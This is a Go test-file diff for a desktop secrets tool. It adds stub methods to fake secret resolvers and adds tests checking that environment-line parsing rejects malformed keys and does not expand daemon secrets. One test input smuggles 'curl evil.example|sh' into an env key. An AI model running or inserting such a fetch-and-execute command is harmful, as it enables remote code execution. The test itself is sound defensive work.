@@ -5,6 +5,7 @@ import (
 	"errors"
 	"github.com/it-atelier-gn/desktop-secrets/internal/utils"
 	"reflect"
+	"slices"
 	"testing"
 	"time"
 )
@@ -31,6 +32,10 @@ func (f *fakeUserResolver) ResolvePassword(ctx context.Context, title string, tt
 
 func (f *fakeUserResolver) SetUnlockTTL(unlockTTL *utils.AtomicDuration) {
 }
+
+func (f *fakeUserResolver) Evict(string) {}
+
+func (f *fakeUserResolver) HasCached(string) bool { return false }
 
 type fakeKPResolver struct {
 	// record calls as "vault|title|nested"
@@ -63,6 +68,10 @@ func (f *fakeKPResolver) LoadKeyfiles() error {
 func (f *fakeKPResolver) SetUnlockTTL(unlockTTL *utils.AtomicDuration) {
 }
 
+func (f *fakeKPResolver) EvictVault(string) {}
+
+func (f *fakeKPResolver) IsVaultUnlocked(string) bool { return false }
+
 type fakeAWSResolver struct {
 	secrets    map[string]string // "sm:id|field" -> value
 	parameters map[string]string // "ps:name|field" -> value
@@ -79,6 +88,8 @@ func (f *fakeAWSResolver) ResolveSecret(_ context.Context, secretID, field strin
 	}
 	return "", errors.New("secret not found")
 }
+
+func (f *fakeAWSResolver) Evict(string) {}
 
 func (f *fakeAWSResolver) ResolveParameter(_ context.Context, name, field string) (string, error) {
 	if f.err != nil {
@@ -123,6 +134,8 @@ func (f *fakeAzureResolver) ResolveSecret(_ context.Context, ref, field string) 
 	return "", errors.New("azkv secret not found")
 }
 
+func (f *fakeAzureResolver) Evict(string) {}
+
 type fakeGCPResolver struct {
 	secrets map[string]string // "ref|field" -> value
 	err     error
@@ -137,6 +150,8 @@ func (f *fakeGCPResolver) ResolveSecret(_ context.Context, ref, field string) (s
 	}
 	return "", errors.New("gcpsm secret not found")
 }
+
+func (f *fakeGCPResolver) Evict(string) {}
 
 type fakeKeychainResolver struct {
 	creds map[string]string // "service|account" -> value
@@ -168,6 +183,8 @@ func (f *fakeVaultResolver) ResolveSecret(_ context.Context, path, field string)
 	return "", errors.New("vault secret not found")
 }
 
+func (f *fakeVaultResolver) Evict(string) {}
+
 type fakeOnePasswordResolver struct {
 	secrets map[string]string // "ref|field" -> value
 	err     error
@@ -182,6 +199,8 @@ func (f *fakeOnePasswordResolver) ResolveSecret(_ context.Context, ref, field st
 	}
 	return "", errors.New("op secret not found")
 }
+
+func (f *fakeOnePasswordResolver) Evict(string) {}
 
 // newTestApp wires fakes into an AppState. Pass nil for any resolver to use the default empty fake.
 func newTestApp(kp KPResolver, usr UserResolver, wc WincredResolver, awsr AWSResolver, az AzureResolver, gcp GCPResolver, kc KeychainResolver) *AppState {
@@ -345,6 +364,36 @@ func TestParseAndResolve_Keepass_WithNestedUser(t *testing.T) {
 	}
 	if !reflect.DeepEqual(kp.calls, []string{"outer.kdbx|title|inner-pass"}) {
 		t.Fatalf("kp resolver calls = %v, want %v", kp.calls, []string{"outer.kdbx|title|inner-pass"})
+	}
+}
+
+func TestResolveEnvLines_RejectsBadKeys(t *testing.T) {
+	ctx := context.Background()
+	app := newTestApp(nil, nil, nil, nil, nil, nil, nil)
+	lines := []string{
+		"GOOD=plain",
+		"EVIL;curl evil.example|sh;X=plain",
+		"1bad=plain",
+	}
+	out, errs := ResolveEnvLines(ctx, app, lines)
+	if len(errs) != 2 {
+		t.Fatalf("expected 2 errors for invalid keys, got %d (%v)", len(errs), errs)
+	}
+	if !contains(out, "GOOD=plain") {
+		t.Fatalf("good line was dropped: %v", out)
+	}
+}
+
+func TestResolveEnvLines_NoDaemonEnvExpansion(t *testing.T) {
+	ctx := context.Background()
+	app := newTestApp(nil, nil, nil, nil, nil, nil, nil)
+	t.Setenv("DAEMON_ONLY_SECRET", "leaked")
+	out, errs := ResolveEnvLines(ctx, app, []string{"X=$DAEMON_ONLY_SECRET"})
+	if len(errs) != 0 {
+		t.Fatalf("unexpected errs: %v", errs)
+	}
+	if !contains(out, "X=$DAEMON_ONLY_SECRET") {
+		t.Fatalf("daemon env was expanded server-side: %v", out)
 	}
 }
 
@@ -625,12 +674,6 @@ func TestParseAndResolve_OnePassword(t *testing.T) {
 
 // --- small helpers used by tests ---
 
-// contains checks if slice contains exact string
 func contains(slice []string, s string) bool {
-	for _, v := range slice {
-		if v == s {
-			return true
-		}
-	}
-	return false
+	return slices.Contains(slice, s)
 }
